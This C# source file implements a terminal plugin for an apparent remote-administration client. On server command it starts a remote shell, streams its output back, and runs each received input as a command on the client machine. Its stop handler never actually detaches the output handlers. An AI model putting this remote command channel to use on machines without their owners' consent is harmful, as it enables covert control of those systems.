namespace TerminalClientPlugin
{
    using System;

    using SyncIO.Client;
    using SyncIO.ClientPlugin;
    using SyncIO.Common.Packets;
    using SyncIO.Network;
    using SyncIO.Transport.Packets;

    public class ClientPlugin : ISyncIOClientPlugin
    {
        #region Variables

        private ISyncIOClient _clientHost;
        private readonly INetHost _netHost;
        private readonly ILoggingHost _loggingHost;

        #endregion

        #region Constructor

        public ClientPlugin(INetHost netHost, ILoggingHost loggingHost)
        {
            _netHost = netHost;
            _loggingHost = loggingHost;

            // Terminal packet handlers
            _netHost.SetHandler<StartTerminalPacket>((c, p) =>
            {
                CRemoteShell.StdOut += (sender, e) => _clientHost.Send(new TerminalPacket(e.Data));
                CRemoteShell.StdError += (sender, e) => _clientHost.Send(new TerminalPacket(e.Data));
                CRemoteShell.Initialize();
            });
            _netHost.SetHandler<StopTerminalPacket>((c, p) =>
            {
                CRemoteShell.StdOut -= (sender, e) => _clientHost.Send(new TerminalPacket(e.Data));
                CRemoteShell.StdError -= (sender, e) => _clientHost.Send(new TerminalPacket(e.Data));
                CRemoteShell.Terminate();
            });
            _netHost.SetHandler<TerminalPacket>((c, p) => CRemoteShell.Execute(p.Input));
        }

        #endregion

        #region Events

        public void OnPluginReady(SyncIOClient client)
        {
            _loggingHost.Trace($"OnPluginReady [ClientHost={client.Id}]");

            _clientHost = client;
        }

        public void OnConnect()
        {
            _loggingHost.Trace("OnConnect");
        }

        public void OnDisconnect(Exception error)
        {
            _loggingHost.Trace($"OnDisconnect [Error={error}]");
        }

        public void OnPacketReceived(IPacket packet)
        {
            _loggingHost.Trace($"OnPacketReceived [Packet={packet}]");
        }

        #endregion
    }
}